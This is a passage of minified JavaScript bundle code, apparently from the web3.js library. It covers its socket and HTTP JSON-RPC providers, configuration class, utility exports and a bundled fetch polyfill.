                if (this.getStatus() === "connecting")
                    return this._pendingRequestsQueue.set(n, o),
                    o.deferredPromise;
                this._sentRequestsQueue.set(n, o);
                try {
                    this._sendToSocket(o.payload)
                } catch (l) {
                    this._sentRequestsQueue.delete(n),
                    this._eventEmitter.emit("error", l)
                }
                return s
            })
        }
        _onConnect() {
            this._connectionStatus = "connected",
            this._reconnectAttempts = 0,
            super._onConnect(),
            this._sendPendingRequests()
        }
        _sendPendingRequests() {
            for (const [e,n] of this._pendingRequestsQueue.entries())
                try {
                    this._sendToSocket(n.payload),
                    this._pendingRequestsQueue.delete(e),
                    this._sentRequestsQueue.set(e, n)
                } catch (s) {
                    this._pendingRequestsQueue.delete(e),
                    this._eventEmitter.emit("error", s)
                }
        }
        _onMessage(e) {
            const n = this._parseResponses(e);
            if (!(Ee(n) || n.length === 0))
                for (const s of n) {
                    if (Yd(s) && s.method.endsWith("_subscription")) {
                        this._eventEmitter.emit("message", s);
                        return
                    }
                    const o = Vl(s) ? s[0].id : s.id
                      , l = this._sentRequestsQueue.get(o);
                    if (!l)
                        return;
                    (Vl(s) || Ur(s) || jr(s)) && (this._eventEmitter.emit("message", s),
                    l.deferredPromise.resolve(s)),
                    this._sentRequestsQueue.delete(o)
                }
        }
        clearQueues(e) {
            this._clearQueues(e)
        }
        _clearQueues(e) {
            this._pendingRequestsQueue.size > 0 && this._pendingRequestsQueue.forEach( (n, s) => {
                n.deferredPromise.reject(new Wm(e)),
                this._pendingRequestsQueue.delete(s)
            }
            ),
            this._sentRequestsQueue.size > 0 && this._sentRequestsQueue.forEach( (n, s) => {
                n.deferredPromise.reject(new Wm(e)),
                this._sentRequestsQueue.delete(s)
            }
            ),
            this._removeSocketListeners()
        }
    }
    const vw = Object.freeze(Object.defineProperty({
        __proto__: null,
        ChunkResponseParser: gw,
        Eip1193Provider: u0,
        EventEmitter: n0,
        SocketProvider: yw,
        Web3DeferredPromise: pd,
        asciiToHex: tw,
        bytesToHex: je,
        bytesToUint8Array: Ai,
        checkAddressCheckSum: LC,
        compareBlockNumbers: FC,
        convert: Qd,
        convertScalarValue: Fl,
        encodePacked: i0,
        ethUnitMap: qd,
        format: ee,
        fromAscii: BC,
        fromDecimal: EC,
        fromTwosComplement: QC,
        fromUtf8: ew,
        fromWei: IC,
        getStorageSlotNumForLongString: $C,
        hexToAscii: nw,
        hexToBytes: lt,
        hexToNumber: sc,
        hexToNumberString: xC,
        hexToString: RC,
        hexToUtf8: Fd,
        isAddress: UC,
        isBatchRequest: di,
        isBatchResponse: Vl,
        isBloom: jC,
        isContractAddressInBloom: zC,
        isContractInitOptions: Dr,
        isDataFormat: Ki,
        isHex: DC,
        isHexStrict: MC,
        isInBloom: PC,
        isNullish: Ee,
        isPromise: uw,
        isResponseRpcError: o0,
        isResponseWithError: jr,
        isResponseWithNotification: Yd,
        isResponseWithResult: Ur,
        isSubscriptionResult: hw,
        isTopic: GC,
        isTopicInBloom: qC,
        isUint8Array: Qr,
        isUserEthereumAddressInBloom: HC,
        isValidResponse: l0,
        jsonRpc: nI,
        keccak256: Xa,
        keccak256Wrapper: Xa,
        leftPad: ql,
        mergeDeep: Vr,
        numberToHex: kt,
        padLeft: Ka,
        padRight: sw,
        pollTillDefined: tI,
        pollTillDefinedAndReturnIntervalId: r0,
        processSolidityEncodePackedArgs: cw,
        randomBytes: Ql,
        randomHex: eI,
        rejectIfConditionAtInterval: fw,
        rejectIfTimeout: s0,
        rightPad: aw,
        setRequestIdStart: mw,
        sha3: ac,
        sha3Raw: Tn,
        soliditySha3: XC,
        soliditySha3Raw: JC,
        stringToHex: SC,
        toAscii: CC,
        toBatchPayload: c0,
        toBigInt: ps,
        toBool: iw,
        toChecksumAddress: _i,
        toDecimal: _C,
        toHex: ir,
        toNumber: hn,
        toPayload: Os,
        toTwosComplement: ow,
        toUtf8: TC,
        toWei: kC,
        uint8ArrayConcat: nn,
        uint8ArrayEquals: Gd,
        utf8ToBytes: t0,
        utf8ToHex: ii,
        uuidV4: a0,
        validateResponse: md,
        waitWithTimeout: dw
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    class Zd {
        constructor() {
            this._emitter = new n0
        }
        on(e, n) {
            this._emitter.on(e, n)
        }
        once(e, n) {
            this._emitter.once(e, n)
        }
        off(e, n) {
            this._emitter.off(e, n)
        }
        emit(e, n) {
            this._emitter.emit(e, n)
        }
        listenerCount(e) {
            return this._emitter.listenerCount(e)
        }
        listeners(e) {
            return this._emitter.listeners(e)
        }
        eventNames() {
            return this._emitter.eventNames()
        }
        removeAllListeners() {
            return this._emitter.removeAllListeners()
        }
        setMaxListenerWarningThreshold(e) {
            this._emitter.setMaxListeners(e)
        }
        getMaxListeners() {
            return this._emitter.getMaxListeners()
        }
    }
    var Ns;
    (function(t) {
        t.CONFIG_CHANGE = "CONFIG_CHANGE"
    }
    )(Ns || (Ns = {}));
    class sI extends Zd {
        constructor(e) {
            super(),
            this.config = {
                handleRevert: !1,
                defaultAccount: void 0,
                defaultBlock: "latest",
                transactionBlockTimeout: 50,
                transactionConfirmationBlocks: 24,
                transactionPollingInterval: 1e3,
                transactionPollingTimeout: 750 * 1e3,
                transactionReceiptPollingInterval: void 0,
                transactionSendTimeout: 750 * 1e3,
                transactionConfirmationPollingInterval: void 0,
                blockHeaderTimeout: 10,
                maxListenersWarningThreshold: 100,
                contractDataInputFill: "data",
                defaultNetworkId: void 0,
                defaultChain: "mainnet",
                defaultHardfork: "london",
                defaultCommon: void 0,
                defaultTransactionType: "0x2",
                defaultMaxPriorityFeePerGas: ir(25e8),
                enableExperimentalFeatures: {
                    useSubscriptionWhenCheckingBlockTimeout: !1,
                    useRpcCallSpecification: !1
                },
                transactionBuilder: void 0,
                transactionTypeParser: void 0,
                customTransactionSchema: void 0,
                defaultReturnFormat: $t,
                ignoreGasPricing: !1
            },
            this.setConfig(e ?? {})
        }
        setConfig(e) {
            const n = Object.keys(e);
            for (const s of n)
                this._triggerConfigChange(s, e[s]),
                !Ee(e[s]) && typeof e[s] == "number" && s === "maxListenersWarningThreshold" && this.setMaxListenerWarningThreshold(Number(e[s]));
            Object.assign(this.config, e)
        }
        get handleRevert() {
            return this.config.handleRevert
        }
        set handleRevert(e) {
            this._triggerConfigChange("handleRevert", e),
            this.config.handleRevert = e
        }
        get contractDataInputFill() {
            return this.config.contractDataInputFill
        }
        set contractDataInputFill(e) {
            this._triggerConfigChange("contractDataInputFill", e),
            this.config.contractDataInputFill = e
        }
        get defaultAccount() {
            return this.config.defaultAccount
        }
        set defaultAccount(e) {
            this._triggerConfigChange("defaultAccount", e),
            this.config.defaultAccount = e
        }
        get defaultBlock() {
            return this.config.defaultBlock
        }
        set defaultBlock(e) {
            this._triggerConfigChange("defaultBlock", e),
            this.config.defaultBlock = e
        }
        get transactionSendTimeout() {
            return this.config.transactionSendTimeout
        }
        set transactionSendTimeout(e) {
            this._triggerConfigChange("transactionSendTimeout", e),
            this.config.transactionSendTimeout = e
        }
        get transactionBlockTimeout() {
            return this.config.transactionBlockTimeout
        }
        set transactionBlockTimeout(e) {
            this._triggerConfigChange("transactionBlockTimeout", e),
            this.config.transactionBlockTimeout = e
        }
        get transactionConfirmationBlocks() {
            return this.config.transactionConfirmationBlocks
        }
        set transactionConfirmationBlocks(e) {
            this._triggerConfigChange("transactionConfirmationBlocks", e),
            this.config.transactionConfirmationBlocks = e
        }
        get transactionPollingInterval() {
            return this.config.transactionPollingInterval
        }
        set transactionPollingInterval(e) {
            this._triggerConfigChange("transactionPollingInterval", e),
            this.config.transactionPollingInterval = e,
            this.transactionReceiptPollingInterval = e,
            this.transactionConfirmationPollingInterval = e
        }
        get transactionPollingTimeout() {
            return this.config.transactionPollingTimeout
        }
        set transactionPollingTimeout(e) {
            this._triggerConfigChange("transactionPollingTimeout", e),
            this.config.transactionPollingTimeout = e
        }
        get transactionReceiptPollingInterval() {
            return this.config.transactionReceiptPollingInterval
        }
        set transactionReceiptPollingInterval(e) {
            this._triggerConfigChange("transactionReceiptPollingInterval", e),
            this.config.transactionReceiptPollingInterval = e
        }
        get transactionConfirmationPollingInterval() {
            return this.config.transactionConfirmationPollingInterval
        }
        set transactionConfirmationPollingInterval(e) {
            this._triggerConfigChange("transactionConfirmationPollingInterval", e),
            this.config.transactionConfirmationPollingInterval = e
        }
        get blockHeaderTimeout() {
            return this.config.blockHeaderTimeout
        }
        set blockHeaderTimeout(e) {
            this._triggerConfigChange("blockHeaderTimeout", e),
            this.config.blockHeaderTimeout = e
        }
        get enableExperimentalFeatures() {
            return this.config.enableExperimentalFeatures
        }
        set enableExperimentalFeatures(e) {
            this._triggerConfigChange("enableExperimentalFeatures", e),
            this.config.enableExperimentalFeatures = e
        }
        get maxListenersWarningThreshold() {
            return this.config.maxListenersWarningThreshold
        }
        set maxListenersWarningThreshold(e) {
            this._triggerConfigChange("maxListenersWarningThreshold", e),
            this.setMaxListenerWarningThreshold(e),
            this.config.maxListenersWarningThreshold = e
        }
        get defaultReturnFormat() {
            return this.config.defaultReturnFormat
        }
        set defaultReturnFormat(e) {
            this._triggerConfigChange("defaultReturnFormat", e),
            this.config.defaultReturnFormat = e
        }
        get defaultNetworkId() {
            return this.config.defaultNetworkId
        }
        set defaultNetworkId(e) {
            this._triggerConfigChange("defaultNetworkId", e),
            this.config.defaultNetworkId = e
        }
        get defaultChain() {
            return this.config.defaultChain
        }
        set defaultChain(e) {
            if (!Ee(this.config.defaultCommon) && !Ee(this.config.defaultCommon.baseChain) && e !== this.config.defaultCommon.baseChain)
                throw new aA(this.config.defaultChain,e);
            this._triggerConfigChange("defaultChain", e),
            this.config.defaultChain = e
        }
        get defaultHardfork() {
            return this.config.defaultHardfork
        }
        set defaultHardfork(e) {
            if (!Ee(this.config.defaultCommon) && !Ee(this.config.defaultCommon.hardfork) && e !== this.config.defaultCommon.hardfork)
                throw new sA(this.config.defaultCommon.hardfork,e);
            this._triggerConfigChange("defaultHardfork", e),
            this.config.defaultHardfork = e
        }
        get defaultCommon() {
            return this.config.defaultCommon
        }
        set defaultCommon(e) {
            if (!Ee(this.config.defaultHardfork) && !Ee(e) && !Ee(e.hardfork) && this.config.defaultHardfork !== e.hardfork)
                throw new sA(this.config.defaultHardfork,e.hardfork);
            if (!Ee(this.config.defaultChain) && !Ee(e) && !Ee(e.baseChain) && this.config.defaultChain !== e.baseChain)
                throw new aA(this.config.defaultChain,e.baseChain);
            this._triggerConfigChange("defaultCommon", e),
            this.config.defaultCommon = e
        }
        get ignoreGasPricing() {
            return this.config.ignoreGasPricing
        }
        set ignoreGasPricing(e) {
            this._triggerConfigChange("ignoreGasPricing", e),
            this.config.ignoreGasPricing = e
        }
        get defaultTransactionType() {
            return this.config.defaultTransactionType
        }
        set defaultTransactionType(e) {
            this._triggerConfigChange("defaultTransactionType", e),
            this.config.defaultTransactionType = e
        }
        get defaultMaxPriorityFeePerGas() {
            return this.config.defaultMaxPriorityFeePerGas
        }
        set defaultMaxPriorityFeePerGas(e) {
            this._triggerConfigChange("defaultMaxPriorityFeePerGas", e),
            this.config.defaultMaxPriorityFeePerGas = e
        }
        get transactionBuilder() {
            return this.config.transactionBuilder
        }
        set transactionBuilder(e) {
            this._triggerConfigChange("transactionBuilder", e),
            this.config.transactionBuilder = e
        }
        get transactionTypeParser() {
            return this.config.transactionTypeParser
        }
        set transactionTypeParser(e) {
            this._triggerConfigChange("transactionTypeParser", e),
            this.config.transactionTypeParser = e
        }
        get customTransactionSchema() {
            return this.config.customTransactionSchema
        }
        set customTransactionSchema(e) {
            this._triggerConfigChange("customTransactionSchema", e),
            this.config.customTransactionSchema = e
        }
        _triggerConfigChange(e, n) {
            this.emit(Ns.CONFIG_CHANGE, {
                name: e,
                oldValue: this.config[e],
                newValue: n
            })
        }
    }
    var Su = {
        exports: {}
    }, _A;
    function aI() {
        return _A || (_A = 1,
        function(t, e) {
            var n = typeof globalThis < "u" && globalThis || typeof self < "u" && self || typeof Da < "u" && Da
              , s = function() {
                function l() {
                    this.fetch = !1,
                    this.DOMException = n.DOMException
                }
                return l.prototype = n,
                new l
            }();
            (function(l) {
                (function(u) {
                    var d = typeof l < "u" && l || typeof self < "u" && self || typeof Da < "u" && Da || {}
                      , p = {
                        searchParams: "URLSearchParams"in d,
                        iterable: "Symbol"in d && "iterator"in Symbol,
                        blob: "FileReader"in d && "Blob"in d && function() {
                            try {
                                return new Blob,
                                !0
                            } catch {
                                return !1
                            }
                        }(),
                        formData: "FormData"in d,
                        arrayBuffer: "ArrayBuffer"in d
                    };
                    function h(B) {
                        return B && DataView.prototype.isPrototypeOf(B)
                    }
                    if (p.arrayBuffer)
                        var m = ["[object Int8Array]", "[object Uint8Array]", "[object Uint8ClampedArray]", "[object Int16Array]", "[object Uint16Array]", "[object Int32Array]", "[object Uint32Array]", "[object Float32Array]", "[object Float64Array]"]
                          , y = ArrayBuffer.isView || function(B) {
                            return B && m.indexOf(Object.prototype.toString.call(B)) > -1
                        }
                        ;
                    function w(B) {
                        if (typeof B != "string" && (B = String(B)),
                        /[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(B) || B === "")
                            throw new TypeError('Invalid character in header field name: "' + B + '"');
                        return B.toLowerCase()
                    }
                    function E(B) {
                        return typeof B != "string" && (B = String(B)),
                        B
                    }
                    function S(B) {
                        var T = {
                            next: function() {
                                var P = B.shift();
                                return {
                                    done: P === void 0,
                                    value: P
                                }
                            }
                        };
                        return p.iterable && (T[Symbol.iterator] = function() {
                            return T
                        }
                        ),
                        T
                    }
                    function _(B) {
                        this.map = {},
                        B instanceof _ ? B.forEach(function(T, P) {
                            this.append(P, T)
                        }, this) : Array.isArray(B) ? B.forEach(function(T) {
                            if (T.length != 2)
                                throw new TypeError("Headers constructor: expected name/value pair to be length 2, found" + T.length);
                            this.append(T[0], T[1])
                        }, this) : B && Object.getOwnPropertyNames(B).forEach(function(T) {
                            this.append(T, B[T])
                        }, this)
                    }
                    _.prototype.append = function(B, T) {
                        B = w(B),
                        T = E(T);
                        var P = this.map[B];
                        this.map[B] = P ? P + ", " + T : T
                    }
                    ,
                    _.prototype.delete = function(B) {
                        delete this.map[w(B)]
                    }
                    ,
                    _.prototype.get = function(B) {
                        return B = w(B),
                        this.has(B) ? this.map[B] : null
                    }
                    ,
                    _.prototype.has = function(B) {
                        return this.map.hasOwnProperty(w(B))
                    }
                    ,
                    _.prototype.set = function(B, T) {
                        this.map[w(B)] = E(T)
                    }
                    ,
                    _.prototype.forEach = function(B, T) {
                        for (var P in this.map)
                            this.map.hasOwnProperty(P) && B.call(T, this.map[P], P, this)
                    }
                    ,
                    _.prototype.keys = function() {
                        var B = [];
                        return this.forEach(function(T, P) {
                            B.push(P)
                        }),
                        S(B)
                    }
                    ,
                    _.prototype.values = function() {
                        var B = [];
                        return this.forEach(function(T) {
                            B.push(T)
                        }),
                        S(B)
                    }
                    ,
                    _.prototype.entries = function() {
                        var B = [];
                        return this.forEach(function(T, P) {
                            B.push([P, T])
                        }),
                        S(B)
                    }
                    ,
                    p.iterable && (_.prototype[Symbol.iterator] = _.prototype.entries);
                    function x(B) {
                        if (!B._noBody) {
                            if (B.bodyUsed)
                                return Promise.reject(new TypeError("Already read"));
                            B.bodyUsed = !0
                        }
                    }
                    function b(B) {
                        return new Promise(function(T, P) {
                            B.onload = function() {
                                T(B.result)
                            }
                            ,
                            B.onerror = function() {
                                P(B.error)
                            }
                        }
                        )
                    }
                    function I(B) {
                        var T = new FileReader
                          , P = b(T);
                        return T.readAsArrayBuffer(B),
                        P
                    }
                    function O(B) {
                        var T = new FileReader
                          , P = b(T)
                          , J = /charset=([A-Za-z0-9_-]+)/.exec(B.type)
                          , ie = J ? J[1] : "utf-8";
                        return T.readAsText(B, ie),
                        P
                    }
                    function z(B) {
                        for (var T = new Uint8Array(B), P = new Array(T.length), J = 0; J < T.length; J++)
                            P[J] = String.fromCharCode(T[J]);
                        return P.join("")
                    }
                    function L(B) {
                        if (B.slice)
                            return B.slice(0);
                        var T = new Uint8Array(B.byteLength);
                        return T.set(new Uint8Array(B)),
                        T.buffer
                    }
                    function Y() {
                        return this.bodyUsed = !1,
                        this._initBody = function(B) {
                            this.bodyUsed = this.bodyUsed,
                            this._bodyInit = B,
                            B ? typeof B == "string" ? this._bodyText = B : p.blob && Blob.prototype.isPrototypeOf(B) ? this._bodyBlob = B : p.formData && FormData.prototype.isPrototypeOf(B) ? this._bodyFormData = B : p.searchParams && URLSearchParams.prototype.isPrototypeOf(B) ? this._bodyText = B.toString() : p.arrayBuffer && p.blob && h(B) ? (this._bodyArrayBuffer = L(B.buffer),
                            this._bodyInit = new Blob([this._bodyArrayBuffer])) : p.arrayBuffer && (ArrayBuffer.prototype.isPrototypeOf(B) || y(B)) ? this._bodyArrayBuffer = L(B) : this._bodyText = B = Object.prototype.toString.call(B) : (this._noBody = !0,
                            this._bodyText = ""),
                            this.headers.get("content-type") || (typeof B == "string" ? this.headers.set("content-type", "text/plain;charset=UTF-8") : this._bodyBlob && this._bodyBlob.type ? this.headers.set("content-type", this._bodyBlob.type) : p.searchParams && URLSearchParams.prototype.isPrototypeOf(B) && this.headers.set("content-type", "application/x-www-form-urlencoded;charset=UTF-8"))
                        }
                        ,
                        p.blob && (this.blob = function() {
                            var B = x(this);
                            if (B)
                                return B;
                            if (this._bodyBlob)
                                return Promise.resolve(this._bodyBlob);
                            if (this._bodyArrayBuffer)
                                return Promise.resolve(new Blob([this._bodyArrayBuffer]));
                            if (this._bodyFormData)
                                throw new Error("could not read FormData body as blob");
                            return Promise.resolve(new Blob([this._bodyText]))
                        }
                        ),
                        this.arrayBuffer = function() {
                            if (this._bodyArrayBuffer) {
                                var B = x(this);
                                return B || (ArrayBuffer.isView(this._bodyArrayBuffer) ? Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset, this._bodyArrayBuffer.byteOffset + this._bodyArrayBuffer.byteLength)) : Promise.resolve(this._bodyArrayBuffer))
                            } else {
                                if (p.blob)
                                    return this.blob().then(I);
                                throw new Error("could not read as ArrayBuffer")
                            }
                        }
                        ,
                        this.text = function() {
                            var B = x(this);
                            if (B)
                                return B;
                            if (this._bodyBlob)
                                return O(this._bodyBlob);
                            if (this._bodyArrayBuffer)
                                return Promise.resolve(z(this._bodyArrayBuffer));
                            if (this._bodyFormData)
                                throw new Error("could not read FormData body as text");
                            return Promise.resolve(this._bodyText)
                        }
                        ,
                        p.formData && (this.formData = function() {
                            return this.text().then(Z)
                        }
                        ),
                        this.json = function() {
                            return this.text().then(JSON.parse)
                        }
                        ,
                        this
                    }
                    var W = ["CONNECT", "DELETE", "GET", "HEAD", "OPTIONS", "PATCH", "POST", "PUT", "TRACE"];
                    function D(B) {
                        var T = B.toUpperCase();
                        return W.indexOf(T) > -1 ? T : B
                    }
                    function se(B, T) {
                        if (!(this instanceof se))
                            throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                        T = T || {};
                        var P = T.body;
                        if (B instanceof se) {
                            if (B.bodyUsed)
                                throw new TypeError("Already read");
                            this.url = B.url,
                            this.credentials = B.credentials,
                            T.headers || (this.headers = new _(B.headers)),
                            this.method = B.method,
                            this.mode = B.mode,
                            this.signal = B.signal,
                            !P && B._bodyInit != null && (P = B._bodyInit,
                            B.bodyUsed = !0)
                        } else
                            this.url = String(B);
                        if (this.credentials = T.credentials || this.credentials || "same-origin",
                        (T.headers || !this.headers) && (this.headers = new _(T.headers)),
                        this.method = D(T.method || this.method || "GET"),
                        this.mode = T.mode || this.mode || null,
                        this.signal = T.signal || this.signal || function() {
                            if ("AbortController"in d) {
                                var R = new AbortController;
                                return R.signal
                            }
                        }(),
                        this.referrer = null,
                        (this.method === "GET" || this.method === "HEAD") && P)
                            throw new TypeError("Body not allowed for GET or HEAD requests");
                        if (this._initBody(P),
                        (this.method === "GET" || this.method === "HEAD") && (T.cache === "no-store" || T.cache === "no-cache")) {
                            var J = /([?&])_=[^&]*/;
                            if (J.test(this.url))
                                this.url = this.url.replace(J, "$1_=" + new Date().getTime());
                            else {
                                var ie = /\?/;
                                this.url += (ie.test(this.url) ? "&" : "?") + "_=" + new Date().getTime()
                            }
                        }
                    }
                    se.prototype.clone = function() {
                        return new se(this,{
                            body: this._bodyInit
                        })
                    }
                    ;
                    function Z(B) {
                        var T = new FormData;
                        return B.trim().split("&").forEach(function(P) {
                            if (P) {
                                var J = P.split("=")
                                  , ie = J.shift().replace(/\+/g, " ")
                                  , R = J.join("=").replace(/\+/g, " ");
                                T.append(decodeURIComponent(ie), decodeURIComponent(R))
                            }
                        }),
                        T
                    }
                    function oe(B) {
                        var T = new _
                          , P = B.replace(/\r?\n[\t ]+/g, " ");
                        return P.split("\r").map(function(J) {
                            return J.indexOf(`
`) === 0 ? J.substr(1, J.length) : J
                        }).forEach(function(J) {
                            var ie = J.split(":")
                              , R = ie.shift().trim();
                            if (R) {
                                var F = ie.join(":").trim();
                                try {
                                    T.append(R, F)
                                } catch (ne) {
                                    console.warn("Response " + ne.message)
                                }
                            }
                        }),
                        T
                    }
                    Y.call(se.prototype);
                    function le(B, T) {
                        if (!(this instanceof le))
                            throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');
                        if (T || (T = {}),
                        this.type = "default",
                        this.status = T.status === void 0 ? 200 : T.status,
                        this.status < 200 || this.status > 599)
                            throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");
                        this.ok = this.status >= 200 && this.status < 300,
                        this.statusText = T.statusText === void 0 ? "" : "" + T.statusText,
                        this.headers = new _(T.headers),
                        this.url = T.url || "",
                        this._initBody(B)
                    }
                    Y.call(le.prototype),
                    le.prototype.clone = function() {
                        return new le(this._bodyInit,{
                            status: this.status,
                            statusText: this.statusText,
                            headers: new _(this.headers),
                            url: this.url
                        })
                    }
                    ,
                    le.error = function() {
                        var B = new le(null,{
                            status: 200,
                            statusText: ""
                        });
                        return B.ok = !1,
                        B.status = 0,
                        B.type = "error",
                        B
                    }
                    ;
                    var ve = [301, 302, 303, 307, 308];
                    le.redirect = function(B, T) {
                        if (ve.indexOf(T) === -1)
                            throw new RangeError("Invalid status code");
                        return new le(null,{
                            status: T,
                            headers: {
                                location: B
                            }
                        })
                    }
                    ,
                    u.DOMException = d.DOMException;
                    try {
                        new u.DOMException
                    } catch {
                        u.DOMException = function(T, P) {
                            this.message = T,
                            this.name = P;
                            var J = Error(T);
                            this.stack = J.stack
                        }
                        ,
                        u.DOMException.prototype = Object.create(Error.prototype),
                        u.DOMException.prototype.constructor = u.DOMException
                    }
                    function ze(B, T) {
                        return new Promise(function(P, J) {
                            var ie = new se(B,T);
                            if (ie.signal && ie.signal.aborted)
                                return J(new u.DOMException("Aborted","AbortError"));
                            var R = new XMLHttpRequest;
                            function F() {
                                R.abort()
                            }
                            R.onload = function() {
                                var re = {
                                    statusText: R.statusText,
                                    headers: oe(R.getAllResponseHeaders() || "")
                                };
                                ie.url.indexOf("file://") === 0 && (R.status < 200 || R.status > 599) ? re.status = 200 : re.status = R.status,
                                re.url = "responseURL"in R ? R.responseURL : re.headers.get("X-Request-URL");
                                var he = "response"in R ? R.response : R.responseText;
                                setTimeout(function() {
                                    P(new le(he,re))
                                }, 0)
                            }
                            ,
                            R.onerror = function() {
                                setTimeout(function() {
                                    J(new TypeError("Network request failed"))
                                }, 0)
                            }
                            ,
                            R.ontimeout = function() {
                                setTimeout(function() {
                                    J(new TypeError("Network request timed out"))
                                }, 0)
                            }
                            ,
                            R.onabort = function() {
                                setTimeout(function() {
                                    J(new u.DOMException("Aborted","AbortError"))
                                }, 0)
                            }
                            ;
                            function ne(re) {
                                try {
                                    return re === "" && d.location.href ? d.location.href : re
                                } catch {
                                    return re
                                }
                            }
                            if (R.open(ie.method, ne(ie.url), !0),
                            ie.credentials === "include" ? R.withCredentials = !0 : ie.credentials === "omit" && (R.withCredentials = !1),
                            "responseType"in R && (p.blob ? R.responseType = "blob" : p.arrayBuffer && (R.responseType = "arraybuffer")),
                            T && typeof T.headers == "object" && !(T.headers instanceof _ || d.Headers && T.headers instanceof d.Headers)) {
                                var ae = [];
                                Object.getOwnPropertyNames(T.headers).forEach(function(re) {
                                    ae.push(w(re)),
                                    R.setRequestHeader(re, E(T.headers[re]))
                                }),
                                ie.headers.forEach(function(re, he) {
                                    ae.indexOf(he) === -1 && R.setRequestHeader(he, re)
                                })
                            } else
                                ie.headers.forEach(function(re, he) {
                                    R.setRequestHeader(he, re)
                                });
                            ie.signal && (ie.signal.addEventListener("abort", F),
                            R.onreadystatechange = function() {
                                R.readyState === 4 && ie.signal.removeEventListener("abort", F)
                            }
                            ),
                            R.send(typeof ie._bodyInit > "u" ? null : ie._bodyInit)
                        }
                        )
                    }
                    return ze.polyfill = !0,
                    d.fetch || (d.fetch = ze,
                    d.Headers = _,
                    d.Request = se,
                    d.Response = le),
                    u.Headers = _,
                    u.Request = se,
                    u.Response = le,
                    u.fetch = ze,
                    u
                }
                )({})
            }
            )(s),
            s.fetch.ponyfill = !0,
            delete s.fetch.polyfill;
            var o = n.fetch ? n : s;
            e = o.fetch,
            e.default = o.fetch,
            e.fetch = o.fetch,
            e.Headers = o.Headers,
            e.Request = o.Request,
            e.Response = o.Response,
            t.exports = e
        }(Su, Su.exports)),
        Su.exports
    }
    var oI = aI();
    const lI = jp(oI);
    var cI = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class Kd extends nc {
        constructor(e, n) {
            if (super(),
            !Kd.validateClientUrl(e))
                throw new tp(e);
            this.clientUrl = e,
            this.httpProviderOptions = n
        }
        static validateClientUrl(e) {
            return typeof e == "string" ? /^http(s)?:\/\//i.test(e) : !1
        }
        getStatus() {
            throw new zi
        }
        supportsSubscriptions() {
            return !1
        }
        request(e, n) {
            var s;
            return cI(this, void 0, void 0, function*() {
                const o = Object.assign(Object.assign({}, (s = this.httpProviderOptions) === null || s === void 0 ? void 0 : s.providerOptions), n)
                  , l = yield lI(this.clientUrl, Object.assign(Object.assign({}, o), {
                    method: "POST",
                    headers: Object.assign(Object.assign({}, o.headers), {
                        "Content-Type": "application/json"
                    }),
                    body: JSON.stringify(e)
                }));
                if (!l.ok)
                    throw new hi(yield l.json(),void 0,void 0,l.status);
                return yield l.json()
            })
        }
        on() {
            throw new zi
        }
        removeListener() {
            throw new zi
        }
        once() {
            throw new zi
        }
        removeAllListeners() {
            throw new zi
        }
        connect() {
            throw new zi
        }
        disconnect() {
            throw new zi
        }
        reset() {
            throw new zi
        }
        reconnect() {
            throw new zi
        }
    }
    var Oa = null;
    typeof WebSocket < "u" ? Oa = WebSocket : typeof MozWebSocket < "u" ? Oa = MozWebSocket : typeof global < "u" ? Oa = global.WebSocket || global.MozWebSocket : typeof window < "u" ? Oa = window.WebSocket || window.MozWebSocket : typeof self < "u" && (Oa = self.WebSocket || self.MozWebSocket);
    const uI = Oa;
    class bw extends yw {
        constructor(e, n, s) {
            super(e, n, s)
        }
        _validateProviderPath(e) {
            return typeof e == "string" ? /^ws(s)?:\/\//i.test(e) : !1
        }
        getStatus() {
            if (this._socketConnection && !Ee(this._socketConnection))
                switch (this._socketConnection.readyState) {
                case this._socketConnection.CONNECTING:
                    return "connecting";
                case this._socketConnection.OPEN:
                    return "connected";
                default:
                    return "disconnected"
                }
            return "disconnected"
        }
        _openSocketConnection() {
            this._socketConnection = new uI(this._socketPath,void 0,this._socketOptions && Object.keys(this._socketOptions).length === 0 ? void 0 : this._socketOptions)
        }
        _closeSocketConnection(e, n) {
            var s;
            (s = this._socketConnection) === null || s === void 0 || s.close(e, n)
        }
        _sendToSocket(e) {
            var n;
            if (this.getStatus() === "disconnected")
                throw new Wm;
            (n = this._socketConnection) === null || n === void 0 || n.send(JSON.stringify(e))
        }
        _parseResponses(e) {
            return this.chunkResponseParser.parseResponse(e.data)
        }
        _addSocketListeners() {
            var e, n, s, o;
            (e = this._socketConnection) === null || e === void 0 || e.addEventListener("open", this._onOpenHandler),
            (n = this._socketConnection) === null || n === void 0 || n.addEventListener("message", this._onMessageHandler),
            (s = this._socketConnection) === null || s === void 0 || s.addEventListener("close", l => this._onCloseHandler(l)),
            (o = this._socketConnection) === null || o === void 0 || o.addEventListener("error", this._onErrorHandler)
        }
        _removeSocketListeners() {
            var e, n, s;
            (e = this._socketConnection) === null || e === void 0 || e.removeEventListener("message", this._onMessageHandler),
            (n = this._socketConnection) === null || n === void 0 || n.removeEventListener("open", this._onOpenHandler),
            (s = this._socketConnection) === null || s === void 0 || s.removeEventListener("close", this._onCloseHandler)
        }
        _onCloseEvent(e) {
            var n;
            if (this._reconnectOptions.autoReconnect && (![1e3, 1001].includes(e.code) || !e.wasClean)) {
                this._reconnect();
                return
            }
            this._clearQueues(e),
            this._removeSocketListeners(),
            this._onDisconnect(e.code, e.reason),
            (n = this._socketConnection) === null || n === void 0 || n.removeEventListener("error", this._onErrorHandler)
        }
    }
    const Aw = t => nc.isWeb3Provider(t)
      , ww = t => typeof t != "string" && "request"in t && t.request.constructor.name === "Function"
      , _w = t => typeof t != "string" && "request"in t && t.request.constructor.name === "AsyncFunction"
      , Ew = t => typeof t != "string" && "send"in t
      , xw = t => typeof t != "string" && "sendAsync"in t
      , gd = t => t && (Aw(t) || _w(t) || ww(t) || xw(t) || Ew(t))
